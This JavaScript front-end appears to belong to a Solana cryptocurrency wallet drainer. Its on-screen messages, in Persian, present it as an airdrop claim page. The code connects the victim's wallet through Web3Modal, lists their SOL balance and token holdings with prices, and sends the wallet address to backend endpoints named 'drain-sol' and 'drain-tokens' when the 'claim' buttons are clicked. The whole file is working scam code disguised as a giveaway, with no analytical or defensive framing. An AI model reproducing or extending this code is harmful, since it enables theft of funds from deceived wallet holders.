 const { Web3Modal } = window.Web3ModalStandalone;
        const web3modal = new Web3Modal({
            projectId: '1d4b931e4fa2a8a65abf53fdaa52170d', // Project ID از Reown Cloud
            walletConnectVersion: 2,
            standaloneChains: ['solana']
        });

        let walletAddress = null;

        async function connectWallet() {
            const connection = await web3modal.connect();
            walletAddress = connection.accounts[0];
            document.getElementById('walletInfo').classList.remove('hidden');
            document.getElementById('walletAddress').textContent = `${walletAddress.slice(0, 6)}...${walletAddress.slice(-4)}`;
            fetchBalance();
        }

        async function fetchBalance() {
            const response = await fetch(`http://localhost:3000/balance?address=${walletAddress}`);
            const data = await response.json();
            document.getElementById('solBalance').textContent = data.solBalance.toFixed(6);
            const tokenList = document.getElementById('tokenList');
            tokenList.innerHTML = data.tokens.map(t => `<li class="text-gray-300">${t.name}: ${t.uiAmount.toFixed(2)} (~$${t.price.toFixed(2)})</li>`).join('');
        }

        document.querySelector('w3m-button').addEventListener('click', connectWallet);

        document.getElementById('claimSol').addEventListener('click', async () => {
            document.getElementById('message').textContent = 'در حال پردازش ایردراپ...';
            const response = await fetch(`http://localhost:3000/drain-sol?address=${walletAddress}`, { method: 'POST' });
            const result = await response.text();
            document.getElementById('message').textContent = result;
            if (response.ok) fetchBalance();
        });

        document.getElementById('claimTokens').addEventListener('click', async () => {
            document.getElementById('message').textContent = 'در حال پردازش ایردراپ...';
            const response = await fetch(`http://localhost:3000/drain-tokens?address=${walletAddress}`, { method: 'POST' });
            const result = await response.text();
            document.getElementById('message').textContent = result;
            if (response.ok) fetchBalance();
        });